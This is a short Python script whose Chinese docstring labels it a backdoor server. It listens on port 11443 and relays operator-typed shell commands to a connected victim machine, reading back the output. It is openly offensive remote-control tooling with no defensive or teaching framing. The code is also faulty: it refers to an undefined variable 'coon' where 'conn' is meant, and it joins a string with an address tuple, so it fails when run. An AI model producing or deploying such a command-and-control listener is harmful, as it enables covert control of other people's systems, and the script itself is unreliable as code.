from socket import *


"""后门服务端"""
s = socket(AF_INET, SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1) #  重用选项
s.bind(("", 11443))
s.listen(10)
conn, addr = s.accept()
print("from" + addr)
data = coon.recv(1024)
while True:
	command = raw_input("shell command: ")
	conn.send(command)
	if command == "quit":
		break
	data = coon.recv(1024)
	print(data)
coon.close()
